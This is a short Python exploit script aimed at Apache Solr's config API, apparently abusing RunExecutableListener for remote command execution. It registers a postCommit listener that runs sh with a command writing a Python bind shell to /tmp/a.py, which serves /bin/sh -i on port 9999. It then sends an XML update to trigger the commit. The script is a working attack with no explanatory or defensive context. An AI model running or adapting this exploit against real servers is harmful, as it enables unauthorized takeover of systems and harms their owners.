#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import json
import readline
import time
import sys
 
solr_ROOT = sys.argv[1] 
url1 = solr_ROOT + '/solr/test/config'
url2 = solr_ROOT + '/solr/test/update'
print(url1)
print(url2)

### sendfile
print('send file')
payload = {"update-listener": {
    "event": "postCommit",
    "name": "shell",
    "class": "solr.RunExecutableListener",
    "exe": "sh",
    "dir": "/bin/",
    "args": ["-c", "touch /tmp/a.py;echo 'import socket,subprocess' > /tmp/a.py;echo 's=socket.socket()' >> /tmp/a.py;echo 's.bind((\"0.0.0.0\",9999))' >> /tmp/a.py;echo 's.listen(5)' >> /tmp/a.py;echo 'talk,addr=s.accept()' >> /tmp/a.py;echo 'proc = subprocess.Popen([\"/bin/sh\",\"-i\"],stdin=talk,stdout=talk, stderr=talk, shell=True)' >> /tmp/a.py;"]
    }
}
headers = {
    'content-type': 'application/json',
}
cmd_send = requests.post(url1, data=json.dumps(payload), headers=(headers))
print(cmd_send)
time.sleep(20)
### update
print('update')
payload1 = '''<add><doc><field name="authors">patricks</field></doc></add>'''
headers1 = {'content-type': 'text/xml',}
cmd_upd = requests.post(url2, data=payload1, headers=(headers1))
print(cmd_upd)
